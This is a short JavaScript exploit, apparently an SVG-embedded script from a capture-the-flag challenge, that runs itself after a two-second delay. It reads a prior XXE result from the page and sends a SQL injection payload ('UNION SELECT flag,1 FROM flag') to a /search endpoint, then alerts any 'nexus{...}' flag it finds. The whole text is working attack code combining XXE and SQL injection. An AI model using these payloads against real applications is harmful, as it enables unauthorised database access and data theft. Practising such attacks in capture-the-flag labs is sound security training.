svg.script:
async function doubleAttack() {
  // XXE Approach
  const xxeResponse = document.getElementById('xxe-result').textContent;

  // Direct Fetch Approach
  try {
    const payload = "%27 UNION SELECT flag,1 FROM flag --";
    const response = await fetch(`/search?q=${encodeURIComponent(payload)}`);
    const data = await response.text();

    const output = `XXE Response: ${xxeResponse || 'empty'}\n\nFetch Response: ${data}`;
    alert(output);

    if(data.includes('nexus{')) {
      alert("FLAG FOUND IN FETCH RESPONSE!\n" + data.match(/nexus\{.*?}/)[0]);
    }
  } catch(e) {
    alert("Fetch Error: " + e.message);
  }
}

// Give XXE time to resolve
setTimeout(doubleAttack, 2000);
